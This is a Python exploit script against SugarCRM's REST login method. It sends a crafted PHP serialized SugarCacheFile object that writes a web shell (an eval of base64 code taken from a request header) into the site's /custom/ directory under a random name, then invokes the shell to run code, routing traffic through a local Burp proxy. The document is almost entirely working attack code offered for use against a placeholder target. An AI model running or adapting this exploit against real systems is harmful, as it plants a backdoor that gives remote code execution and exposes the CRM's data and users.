import requests
import random
import string
import base64

# Configuration
TARGET_URL = "http://example.com/sugarcrm"  # Replace with your actual target
REST_ENDPOINT = "/service/v4/rest.php"
CUSTOM_DIR = "/custom/"

# Proxy configuration for Burp Suite
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}
verify_ssl = False  # Disable SSL verification for Burp interception

# Generate random PHP filename
filename = ''.join(random.choices(string.ascii_letters, k=random.randint(8, 12))) + ".php"
upload_path = CUSTOM_DIR + filename

# Create the serialized payload
php_code = "<?php eval(base64_decode($_SERVER['HTTP_PAYLOAD'])); ?>"
php_code_length = len(php_code)

payload_serialized = (
    "O:+14:\"SugarCacheFile\":23:{"
    "S:17:\"\x00*\x00_cacheFileName\";"
    f"s:{len(upload_path)+2}:\"..{upload_path}\";"
    "S:16:\"\x00*\x00_cacheChanged\";b:1;"
    "S:14:\"\x00*\x00_localStore\";a:1:{i:0;"
    f"s:{php_code_length}:\"{php_code}\";}}"
)

# Step 1: Upload the PHP file
print("[*] Uploading PHP payload via unserialize exploit...")
post_data = {
    'method': 'login',
    'input_type': 'Serialize',
    'rest_data': payload_serialized
}

try:
    upload_response = requests.post(
        TARGET_URL + REST_ENDPOINT,
        data=post_data,
        proxies=proxies,
        verify=verify_ssl
    )

    if upload_response.status_code != 200:
        print(f"[!] Upload failed with status code {upload_response.status_code}")
    else:
        print(f"[+] PHP payload uploaded to {upload_path}")

        # Step 2: Execute the uploaded PHP file
        print("[*] Executing uploaded PHP payload...")
        encoded_payload = base64.b64encode(b"echo 'Exploit executed';").decode()
        headers = {
            'payload': encoded_payload
        }

        exec_response = requests.get(
            TARGET_URL + upload_path,
            headers=headers,
            proxies=proxies,
            verify=verify_ssl
        )

        if exec_response.status_code == 200:
            print("[+] Payload executed successfully")
            print("Response:", exec_response.text)
        else:
            print(f"[!] Payload execution failed with status code {exec_response.status_code}")

except requests.exceptions.ProxyError as e:
    print("[!] Proxy connection failed. Is Burp Suite running and listening on 127.0.0.1:8080?")
    print("Error:", e)
